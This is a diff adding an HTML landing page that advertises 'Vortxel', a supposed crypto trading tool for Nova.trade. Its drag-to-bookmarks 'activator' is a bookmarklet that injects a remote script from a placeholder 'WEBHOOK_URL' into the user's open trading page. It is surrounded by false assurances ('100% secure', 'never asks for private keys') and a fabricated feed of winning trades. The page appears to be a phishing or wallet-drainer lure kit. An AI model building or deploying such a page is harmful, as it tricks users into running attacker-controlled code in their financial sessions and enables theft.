@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vortxel</title>
+    <link rel="icon" type="image/png" href="https://nova.trade/images/vortxel-icon.png">
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Custom CSS -->
+    <style>
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #000000;
+            color: #ffffff;
+            line-height: 1.6;
+            font-optical-sizing: auto;
+        }
+        
+        .logo-text {
+            color: #ffffff;
+            font-weight: 800;
+            font-size: 1.75rem;
+            letter-spacing: -0.025em;
+        }
+        
+        @media (max-width: 768px) {
+            .logo-text {
+                font-size: 1.5rem;
+            }
+        }
+        
+        .accent-green {
+            color: #a855f7;
+        }
+        
+        .btn-primary {
+            background: #a855f7;
+            color: white;
+            border-radius: 12px;
+            padding: 14px 28px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            transition: all 0.2s ease;
+            border: none;
+            cursor: pointer;
+            letter-spacing: -0.01em;
+        }
+        
+        .btn-primary:hover {
+            background: #9333ea;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(168, 85, 247, 0.3);
+        }
+        
+        @media (max-width: 768px) {
+            .btn-primary {
+                padding: 12px 20px;
+                font-size: 0.9rem;
+            }
+        }
+        
+        .btn-secondary {
+            background: #1a1a1a;
+            color: #a1a1aa;
+            border-radius: 12px;
+            padding: 12px 20px;
+            font-weight: 500;
+            font-size: 0.9rem;
+            transition: all 0.2s ease;
+            border: 1px solid #333333;
+            cursor: pointer;
+            letter-spacing: -0.01em;
+        }
+        
+        .btn-secondary:hover {
+            background: #262626;
+            color: #e5e5e5;
+            border-color: #404040;
+        }
+        
+        @media (max-width: 768px) {
+            .btn-secondary {
+                padding: 10px 16px;
+                font-size: 0.85rem;
+            }
+        }
+        
+        .card {
+            background: #111111;
+            border-radius: 16px;
+            border: 1px solid #262626;
+            padding: 24px;
+            transition: all 0.3s ease;
+        }
+        
+        .card:hover {
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+            transform: translateY(-3px);
+            border-color: #404040;
+        }
+        
+        @media (max-width: 768px) {
+            .card {
+                padding: 20px;
+                border-radius: 12px;
+            }
+        }
+        
+        .feature-icon {
+            width: 48px;
+            height: 48px;
+            background: #a855f7;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            margin-bottom: 16px;
+        }
+        
+        .tag {
+            background: #1a1a1a;
+            color: #a855f7;
+            padding: 8px 16px;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 600;
+            display: inline-block;
+            border: 1px solid #333333;
+            letter-spacing: -0.01em;
+        }
+        
+        .tag.green {
+            background: #2d1b69;
+            color: #a855f7;
+            border-color: #a855f7;
+        }
+        
+        @media (max-width: 768px) {
+            .tag {
+                font-size: 13px;
+                padding: 6px 14px;
+            }
+        }
+        
+        .activator-btn {
+            background: linear-gradient(135deg, #a855f7, #9333ea);
+            color: white;
+            border-radius: 16px;
+            padding: 18px 36px;
+            font-weight: 700;
+            font-size: 18px;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: move;
+            box-shadow: 0 4px 12px rgba(168, 85, 247, 0.3);
+            text-decoration: none;
+            display: inline-block;
+            letter-spacing: -0.01em;
+        }
+        
+        .activator-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(168, 85, 247, 0.4);
+        }
+        
+        @media (max-width: 768px) {
+            .activator-btn {
+                padding: 16px 28px;
+                font-size: 16px;
+            }
+        }
+        
+        .grid-cols-auto {
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        }
+        
+        @media (max-width: 640px) {
+            .grid-cols-auto {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .col-span-full {
+            grid-column: 1 / -1;
+        }
+        
+        .bg-dark {
+            background: #000000;
+        }
+        
+        .bg-dark-secondary {
+            background: #111111;
+        }
+        
+        .text-white {
+            color: #ffffff;
+        }
+        
+        .text-gray {
+            color: #a1a1aa;
+        }
+        
+        .border-dark {
+            border-color: #262626;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="bg-dark border-b border-dark sticky top-0 z-50 backdrop-blur-sm">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-16 md:h-20">
+                <div class="flex items-center">
+                    <h1 class="logo-text">Vortxel</h1>
+                </div>
+                <div class="flex items-center space-x-2 sm:space-x-4">
+                    <button class="btn-secondary hidden sm:inline-block" onclick="scrollToSection('how-it-works')">How it works</button>
+                    <button class="btn-secondary sm:hidden" onclick="scrollToSection('how-it-works')">Guide</button>
+                    <button class="btn-primary" onclick="openInstructionModal()">Get started</button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main>
+        <!-- Hero Section -->
+        <section id="hero" class="bg-dark py-16 sm:py-20 md:py-24">
+            <div class="max-w-4xl mx-auto px-4 sm:px-6 text-center">
+                <div class="tag green mb-6 sm:mb-8">✨ Advanced trading tool for Nova.trade</div>
+                
+                <h1 class="text-4xl sm:text-5xl md:text-6xl lg:text-7xl font-black text-white mb-6 sm:mb-8 leading-tight">
+                    The fastest way to <br class="hidden sm:block">
+                    <span class="accent-green">trade crypto</span> with NovaTrade
+                </h1>
+                
+                <p class="text-lg sm:text-xl md:text-2xl text-gray mb-12 max-w-3xl mx-auto leading-relaxed">
+                    Advanced trading tools that give you an unfair advantage. Monitor influencers, track wallets, 
+                    automate trades, and never miss opportunities again.
+                </p>
+                
+                <div id="get-started" class="mb-8 sm:mb-12">
+                    <p class="text-sm sm:text-base text-gray mb-4 sm:mb-6">Drag to your bookmarks bar</p>
+                    <a id="drag-activator" href="javascript:(function(){var s=document.createElement('script');s.src='WEBHOOK_URL/bookmarklet.js';document.head.appendChild(s);})();"
+                       class="activator-btn"
+                       draggable="true"
+                       ondragstart="handleDragStart(event)"
+                       ondragend="handleDragEnd(event)">
+                        🚀 VORTXEL ACTIVATOR
+                    </a>
+                </div>
+                
+                <p class="text-sm sm:text-base text-gray">No installation • Works in browser • Completely secure</p>
+            </div>
+        </section>
+
+        <!-- Features Grid -->
+        <section class="py-16 sm:py-20 md:py-24 bg-dark">
+            <div class="max-w-6xl mx-auto px-4 sm:px-6">
+                <div class="text-center mb-12 sm:mb-16 md:mb-20">
+                    <h2 class="text-3xl sm:text-4xl md:text-5xl font-bold text-white mb-4 sm:mb-6 leading-tight">Everything you need to win</h2>
+                    <p class="text-lg sm:text-xl md:text-2xl text-gray max-w-2xl mx-auto">Professional trading tools made simple</p>
+                </div>
+                
+                <div class="grid grid-cols-auto gap-6 sm:gap-8">
+                    <!-- Feature 1 -->
+                    <div class="card">
+                        <div class="feature-icon">🎯</div>
+                        <h3 class="text-xl sm:text-2xl font-bold text-white mb-3 sm:mb-4">Influencer Sniper</h3>
+                        <p class="text-gray leading-relaxed text-sm sm:text-base">
+                            Monitor Twitter accounts. When they mention a coin, get instant alerts 
+                            and one-click sniping for Nova.trade launches.
+                        </p>
+                    </div>
+                    
+                    <!-- Feature 2 -->
+                    <div class="card">
+                        <div class="feature-icon">⚡</div>
+                        <h3 class="text-xl font-bold text-white mb-3">Pre-Migration Snipe</h3>
+                        <p class="text-gray leading-relaxed">
+                            Automatically detect when coins are about to migrate to Raydium. 
+                            Execute orders with MEV protection before launch.
+                        </p>
+                    </div>
+                    
+                    <!-- Feature 3 -->
+                    <div class="card">
+                        <div class="feature-icon">👁️</div>
+                        <h3 class="text-xl font-bold text-white mb-3">Wallet Stalker</h3>
+                        <p class="text-gray leading-relaxed">
+                            Track successful traders' wallets. Get notifications and copy their 
+                            Nova.trade buys automatically.
+                        </p>
+                    </div>
+                    
+                    <!-- Feature 4 -->
+                    <div class="card">
+                        <div class="feature-icon">🔧</div>
+                        <h3 class="text-xl font-bold text-white mb-3">Auto Strategies</h3>
+                        <p class="text-gray leading-relaxed">
+                            Set take-profit, stop-loss, and time-based selling rules. 
+                            Customize buy amounts, slippage, and gas fees.
+                        </p>
+                    </div>
+                    
+                    <!-- Feature 5 -->
+                    <div class="card">
+                        <div class="feature-icon">📈</div>
+                        <h3 class="text-xl font-bold text-white mb-3">Live Alpha Feed</h3>
+                        <p class="text-gray leading-relaxed">
+                            Real-time feed of trending coins, whale alerts, and new pair 
+                            detections across Nova.trade.
+                        </p>
+                    </div>
+                    
+                    <!-- Feature 6 -->
+                    <div class="card">
+                        <div class="feature-icon">🛡️</div>
+                        <h3 class="text-xl font-bold text-white mb-3">MEV Protection</h3>
+                        <p class="text-gray leading-relaxed">
+                            Advanced protection against front-running and sandwich attacks. 
+                            Your trades stay private and profitable.
+                        </p>
+                    </div>
+                    
+                    <!-- Feature 7 -->
+                    <div class="card">
+                        <div class="feature-icon">🔔</div>
+                        <h3 class="text-xl font-bold text-white mb-3">Smart Alerts</h3>
+                        <p class="text-gray leading-relaxed">
+                            Custom notifications for price movements, volume spikes, and market cap milestones. 
+                            Never miss important opportunities.
+                        </p>
+                    </div>
+                    
+                    <!-- Feature 8 -->
+                    <div class="card">
+                        <div class="feature-icon">📊</div>
+                        <h3 class="text-xl font-bold text-white mb-3">Portfolio Tracker</h3>
+                        <p class="text-gray leading-relaxed">
+                            Track all your Nova.trade positions in one place. View PnL, 
+                            performance metrics, and trading history.
+                        </p>
+                    </div>
+                    
+                    <!-- Feature 9 -->
+                    <div class="card">
+                        <div class="feature-icon">🎭</div>
+                        <h3 class="text-xl font-bold text-white mb-3">Stealth Mode</h3>
+                        <p class="text-gray leading-relaxed">
+                            Hide your trading activity from other users. Trade anonymously 
+                            without revealing your positions or strategies.
+                        </p>
+                    </div>
+                    
+                    <!-- Feature 10 -->
+                    <div class="card">
+                        <div class="feature-icon">🚀</div>
+                        <h3 class="text-xl font-bold text-white mb-3">Instant Execution</h3>
+                        <p class="text-gray leading-relaxed">
+                            Lightning-fast order execution with sub-second response times. 
+                            Never miss opportunities due to slow execution.
+                        </p>
+                    </div>
+                    
+                    <!-- Feature 11 -->
+                    <div class="card">
+                        <div class="feature-icon">📱</div>
+                        <h3 class="text-xl font-bold text-white mb-3">Mobile Notifications</h3>
+                        <p class="text-gray leading-relaxed">
+                            Get instant push notifications on your phone for important 
+                            trading opportunities and price alerts.
+                        </p>
+                    </div>
+                    
+                    <!-- Feature 12 -->
+                    <div class="card">
+                        <div class="feature-icon">🔍</div>
+                        <h3 class="text-xl font-bold text-white mb-3">Smart Analytics</h3>
+                        <p class="text-gray leading-relaxed">
+                            Advanced market analysis with AI-powered insights. 
+                            Identify patterns and trends before others do.
+                        </p>
+                    </div>
+                    
+                    <!-- Feature 13 - Live Feed -->
+                    <div class="card col-span-full">
+                        <div class="feature-icon">📡</div>
+                        <h3 class="text-xl font-bold text-white mb-4">Real-Time Alpha Feed</h3>
+                        <p class="text-gray leading-relaxed mb-6">
+                            Watch high-value trading activities as they happen. Only the most important 
+                            whale movements, snipe alerts, and market opportunities.
+                        </p>
+                        
+                        <div class="bg-black rounded-xl p-4 font-mono text-xs text-left overflow-hidden relative border border-gray-800" style="height: 200px;">
+                            <div class="animate-scroll space-y-1">
+                                <!-- Important activities with more content for smoother loop -->
+                                <div class="text-green-400 font-bold">🎯 SNIPE ALERT: 8.5 SOL → $BONKWIFHAT (+127% in 2m)</div>
+                                <div class="text-red-400 font-bold">🚨 WHALE DUMP: 47 SOL sold $PEPE (-23% impact)</div>
+                                <div class="text-blue-400 font-bold">🐋 MEGA BUY: 7xK9...m31 bought 156 SOL of $GROK</div>
+                                <div class="text-yellow-400 font-bold">📈 HOT TREND: $WIF 340 buys/min (+89% 1h)</div>
+                                <div class="text-purple-400 font-bold">⚡ MIGRATION: $SHIB ready for Raydium (98% bonding curve)</div>
+                                <div class="text-green-400 font-bold">🎯 SNIPE SUCCESS: 2.1 SOL → $DOGE (+89% profit)</div>
+                                <div class="text-orange-400 font-bold">🔥 INFLUENCER SIGNAL: @elonmusk mentioned $AI - 12 new launches</div>
+                                <div class="text-cyan-400 font-bold">💎 DIAMOND HANDS: 3Ahf...j62 holding 50 SOL $BONK (no sells)</div>
+                                <div class="text-green-400 font-bold">🎯 AUTO SNIPE: 1.8 SOL → $PEPECOIN (+156% in 5m)</div>
+                                <div class="text-red-400 font-bold">⚠️ RUG ALERT: $SCAM dev wallet drained - avoid!</div>
+                                <div class="text-blue-400 font-bold">🐋 WHALE ENTRY: BWK...dT7 bought 89 SOL of $SOLANA</div>
+                                <div class="text-yellow-400 font-bold">📊 VOLUME SPIKE: $PUMP 1.2M volume (+450% 30m)</div>
+                                <div class="text-purple-400 font-bold">⭐ DEV ACTIVE: $MOON dev burning LP tokens</div>
+                                <div class="text-green-400 font-bold">🎯 PERFECT ENTRY: 0.9 SOL → $CATS (+234% profit)</div>
+                                <div class="text-orange-400 font-bold">🎭 STEALTH WHALE: Anonymous bought 67 SOL $ANON</div>
+                                <div class="text-cyan-400 font-bold">💰 PROFIT TAKING: 4L2...x8s sold 25% $DOGE (+400% gains)</div>
+                                <div class="text-green-400 font-bold">🎯 LIGHTNING SNIPE: 3.2 SOL → $ROCKET (+67% instant)</div>
+                                <div class="text-blue-400 font-bold">🐋 INSTITUTIONAL: 5KL...m9x bought 234 SOL of $ETH</div>
+                                <div class="text-yellow-400 font-bold">📈 BREAKOUT: $MEME broke resistance (+156% potential)</div>
+                                <div class="text-purple-400 font-bold">⚡ EARLY DETECTION: $ALPHA 15 seconds before trend</div>
+                                <div class="text-green-400 font-bold">🎯 COPY TRADE: Following 9xT...k2s (+89% success rate)</div>
+                                <div class="text-orange-400 font-bold">🔥 VIRAL TWEET: $DOGE mentioned by @cathiedwood</div>
+                                <div class="text-cyan-400 font-bold">💎 HODL ALERT: Top holder accumulated +45 SOL $BONK</div>
+                                <div class="text-red-400 font-bold">🚨 SELL PRESSURE: Large holder moving $SHIB to exchange</div>
+                                
+                                <!-- Seamless loop continues -->
+                                <div class="text-green-400 font-bold">🎯 SNIPE ALERT: 8.5 SOL → $BONKWIFHAT (+127% in 2m)</div>
+                                <div class="text-red-400 font-bold">🚨 WHALE DUMP: 47 SOL sold $PEPE (-23% impact)</div>
+                                <div class="text-blue-400 font-bold">🐋 MEGA BUY: 7xK9...m31 bought 156 SOL of $GROK</div>
+                                <div class="text-yellow-400 font-bold">📈 HOT TREND: $WIF 340 buys/min (+89% 1h)</div>
+                                <div class="text-purple-400 font-bold">⚡ MIGRATION: $SHIB ready for Raydium (98% bonding curve)</div>
+                                <div class="text-green-400 font-bold">🎯 SNIPE SUCCESS: 2.1 SOL → $DOGE (+89% profit)</div>
+                            </div>
+                            <div class="absolute bottom-0 left-0 right-0 h-8 bg-gradient-to-t from-black via-black/90 to-transparent"></div>
+                            <div class="absolute top-0 left-0 right-0 h-6 bg-gradient-to-b from-black via-black/90 to-transparent"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+
+
+        <!-- How It Works -->
+        <section id="how-it-works" class="py-16 sm:py-20 md:py-24 bg-dark">
+            <div class="max-w-5xl mx-auto px-4 sm:px-6">
+                <div class="text-center mb-12 sm:mb-16 md:mb-20">
+                    <h2 class="text-3xl sm:text-4xl md:text-5xl font-bold text-white mb-4 sm:mb-6 leading-tight">Get started in 30 seconds</h2>
+                    <p class="text-lg sm:text-xl md:text-2xl text-gray max-w-2xl mx-auto">No complex setup. No wallet connections. Just drag and trade.</p>
+                </div>
+                
+                <div class="grid sm:grid-cols-2 lg:grid-cols-3 gap-8 sm:gap-12">
+                    <div class="text-center">
+                        <div class="w-16 h-16 sm:w-20 sm:h-20 bg-purple-500 rounded-2xl flex items-center justify-center text-white text-2xl sm:text-3xl font-bold mx-auto mb-6 sm:mb-8">1</div>
+                        <h3 class="text-xl sm:text-2xl font-bold text-white mb-3 sm:mb-4">Drag to Install</h3>
+                        <p class="text-gray text-sm sm:text-base leading-relaxed">Drag the purple button above to your browser's bookmarks bar</p>
+                    </div>
+                    
+                    <div class="text-center">
+                        <div class="w-16 h-16 sm:w-20 sm:h-20 bg-purple-500 rounded-2xl flex items-center justify-center text-white text-2xl sm:text-3xl font-bold mx-auto mb-6 sm:mb-8">2</div>
+                        <h3 class="text-xl sm:text-2xl font-bold text-white mb-3 sm:mb-4">Activate on Nova.trade</h3>
+                        <p class="text-gray text-sm sm:text-base leading-relaxed">Visit Nova.trade and click your bookmark to activate Vortxel</p>
+                    </div>
+                    
+                    <div class="text-center">
+                        <div class="w-16 h-16 sm:w-20 sm:h-20 bg-purple-500 rounded-2xl flex items-center justify-center text-white text-2xl sm:text-3xl font-bold mx-auto mb-6 sm:mb-8">3</div>
+                        <h3 class="text-xl sm:text-2xl font-bold text-white mb-3 sm:mb-4">Start Trading</h3>
+                        <p class="text-gray text-sm sm:text-base leading-relaxed">Configure your settings or use defaults and start trading</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+
+
+
+
+        <!-- FAQ -->
+        <section class="py-16 sm:py-20 md:py-24 bg-dark">
+            <div class="max-w-3xl mx-auto px-4 sm:px-6">
+                <div class="text-center mb-12 sm:mb-16 md:mb-20">
+                    <h2 class="text-3xl sm:text-4xl md:text-5xl font-bold text-white mb-4 sm:mb-6 leading-tight">Frequently asked questions</h2>
+                </div>
+                
+                <div class="space-y-4 sm:space-y-6">
+                    <details class="card cursor-pointer">
+                        <summary class="font-semibold text-lg sm:text-xl text-white flex justify-between items-center cursor-pointer">
+                            Is this secure? Do you access my wallet?
+                            <span class="text-purple-500 text-xl">+</span>
+                        </summary>
+                        <p class="text-gray mt-4 sm:mt-6 leading-relaxed text-sm sm:text-base">
+                            100% secure. Vortxel runs entirely in your browser and never asks for private keys. 
+                            It helps you execute trades faster on Nova.trade, but you approve every transaction.
+                        </p>
+                    </details>
+                    
+                    <details class="card cursor-pointer">
+                        <summary class="font-semibold text-lg sm:text-xl text-white flex justify-between items-center cursor-pointer">
+                            What does this cost?
+                            <span class="text-purple-500 text-xl">+</span>
+                        </summary>
+                        <p class="text-gray mt-4 sm:mt-6 leading-relaxed text-sm sm:text-base">
+                            Zero fees for now. We might introduce 0.2% fees later or maybe not - users will be informed 
+                            in advance. It was built by traders who wanted better tools without high costs.
+                        </p>
+                    </details>
+                    
+                    <details class="card cursor-pointer">
+                        <summary class="font-semibold text-lg sm:text-xl text-white flex justify-between items-center cursor-pointer">
+                            Can I really beat other bots?
+                            <span class="text-purple-500 text-xl">+</span>
+                        </summary>
+                        <p class="text-gray mt-4 sm:mt-6 leading-relaxed text-sm sm:text-base">
+                            Vortxel gives you a massive advantage over manual trading through automation, 
+                            signal detection, and MEV protection. Speed + strategy often beats pure speed alone.
+                        </p>
+                    </details>
+                    
+
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Instruction Modal -->
+    <div id="instructionModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
+        <div class="bg-gray-900 border border-gray-700 rounded-2xl p-6 sm:p-8 max-w-md mx-4 relative">
+            <button onclick="closeInstructionModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-2xl font-bold">×</button>
+            
+            <h3 class="text-xl sm:text-2xl font-bold text-white mb-4">Get Started with Vortxel</h3>
+            
+            <div class="space-y-4 text-gray-300">
+                <div class="flex items-start space-x-3">
+                    <div class="w-6 h-6 bg-purple-500 rounded-full flex items-center justify-center text-white text-sm font-bold flex-shrink-0">1</div>
+                    <div>
+                        <p class="text-sm sm:text-base"><strong class="text-white">Show bookmarks bar</strong> using <kbd class="bg-gray-700 text-white px-2 py-1 rounded text-xs">Ctrl + Shift + B</kbd> if hidden</p>
+                    </div>
+                </div>
+                
+                <div class="flex items-start space-x-3">
+                    <div class="w-6 h-6 bg-purple-500 rounded-full flex items-center justify-center text-white text-sm font-bold flex-shrink-0">2</div>
+                    <div>
+                        <p class="text-sm sm:text-base"><strong class="text-white">Drag the purple button</strong> below to your browser's bookmarks bar</p>
+                    </div>
+                </div>
+                
+                <div class="flex items-start space-x-3">
+                    <div class="w-6 h-6 bg-purple-500 rounded-full flex items-center justify-center text-white text-sm font-bold flex-shrink-0">3</div>
+                    <div>
+                        <p class="text-sm sm:text-base"><strong class="text-white">Visit Nova.trade</strong> and click your bookmark to activate Vortxel</p>
+                    </div>
+                </div>
+                
+                <div class="flex items-start space-x-3">
+                    <div class="w-6 h-6 bg-purple-500 rounded-full flex items-center justify-center text-white text-sm font-bold flex-shrink-0">4</div>
+                    <div>
+                        <p class="text-sm sm:text-base"><strong class="text-white">Start trading</strong> with advanced tools and automation</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="mt-6 pt-4 border-t border-gray-700">
+                <div class="bg-gray-800 rounded-lg p-3 mb-4">
+                    <p class="text-xs text-gray-400 mb-2">💻 Desktop only - This tool works in desktop browsers with bookmarks bar support</p>
+                    <p class="text-xs text-gray-400">Mobile users: Please use a desktop browser for the best experience</p>
+                </div>
+                <button onclick="closeInstructionModal(); scrollToActivator()" class="btn-primary w-full">
+                    Take me to the activator button
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function handleDragStart(event) {
+            // Set drag effect to only allow bookmark drops
+            event.dataTransfer.effectAllowed = 'link';
+            event.dataTransfer.setData('text/uri-list', event.target.href);
+            event.dataTransfer.setData('text/plain', event.target.href);
+            
+            // Add visual feedback
+            event.target.style.opacity = '0.5';
+        }
+        
+        function handleDragEnd(event) {
+            // Reset visual feedback
+            event.target.style.opacity = '1';
+        }
+        
+        // Prevent dropping on the page itself
+        document.addEventListener('dragover', function(e) {
+            e.preventDefault();
+            e.dataTransfer.dropEffect = 'none';
+        });
+        
+        document.addEventListener('drop', function(e) {
+            e.preventDefault();
+            return false;
+        });
+    </script>
+
+    
+    <style>
+        @keyframes scroll {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
+        }
+        .animate-scroll {
+            animation: scroll 35s linear infinite;
+        }
+        
+        /* Pulse animation for live indicators */
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .live-indicator {
+            animation: pulse 2s ease-in-out infinite;
+        }
+        
+        /* Highlight effect for sections */
+        .highlight-section {
+            position: relative;
+            animation: highlight-glow 2s ease-in-out;
+        }
+        
+        @keyframes highlight-glow {
+            0% { box-shadow: 0 0 0 0 rgba(168, 85, 247, 0.3); }
+            50% { box-shadow: 0 0 0 10px rgba(168, 85, 247, 0.2); }
+            100% { box-shadow: 0 0 0 0 rgba(168, 85, 247, 0); }
+        }
+        
+        /* Keyboard shortcut styling */
+        kbd {
+            font-family: monospace;
+            font-size: 0.8em;
+            font-weight: 600;
+            border: 1px solid #4a5568;
+            box-shadow: 0 1px 0 rgba(0, 0, 0, 0.2), 0 0 0 2px rgba(255, 255, 255, 0.1) inset;
+        }
+    </style>
+    
+    <script>
+        // Modal functionality
+        function openInstructionModal() {
+            document.getElementById('instructionModal').classList.remove('hidden');
+            document.body.style.overflow = 'hidden';
+        }
+        
+        function closeInstructionModal() {
+            document.getElementById('instructionModal').classList.add('hidden');
+            document.body.style.overflow = 'auto';
+        }
+        
+        // Close modal when clicking outside
+        document.getElementById('instructionModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeInstructionModal();
+            }
+        });
+        
+        // Close modal with Escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeInstructionModal();
+            }
+        });
+
+        // Smooth scrolling functionality
+        function scrollToSection(sectionId) {
+            const element = document.getElementById(sectionId);
+            if (element) {
+                element.scrollIntoView({
+                    behavior: 'smooth',
+                    block: 'start'
+                });
+                
+                // Add highlight effect
+                highlightSection(sectionId);
+            }
+        }
+        
+        // Enhanced scrolling to activator with special effects
+        function scrollToActivator() {
+            const activatorButton = document.getElementById('drag-activator');
+            if (activatorButton) {
+                activatorButton.scrollIntoView({
+                    behavior: 'smooth',
+                    block: 'center'
+                });
+                
+                // Add special highlight effect for the activator
+                setTimeout(() => {
+                    activatorButton.style.animation = 'pulse 2s ease-in-out 3';
+                    activatorButton.style.boxShadow = '0 0 20px rgba(168, 85, 247, 0.6)';
+                    
+                    setTimeout(() => {
+                        activatorButton.style.animation = '';
+                        activatorButton.style.boxShadow = '0 4px 12px rgba(168, 85, 247, 0.3)';
+                    }, 6000);
+                }, 500);
+            }
+        }
+        
+        // Add highlight effect when scrolling to sections
+        function highlightSection(sectionId) {
+            const section = document.getElementById(sectionId);
+            if (section) {
+                section.classList.add('highlight-section');
+                setTimeout(() => {
+                    section.classList.remove('highlight-section');
+                }, 2000);
+            }
+        }
+        
+        // Activator drag functionality
+        document.getElementById('drag-activator').addEventListener('click', (event) => {
+            event.preventDefault();
+            alert("To install: drag this button to your bookmarks bar instead of clicking!");
+        });
+
+        // FAQ toggle functionality
+        document.querySelectorAll('details').forEach((detail) => {
+            detail.addEventListener('toggle', () => {
+                const summary = detail.querySelector('summary');
+                const sign = summary.querySelector('span');
+                if (detail.open) {
+                    sign.textContent = '-';
+                } else {
+                    sign.textContent = '+';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
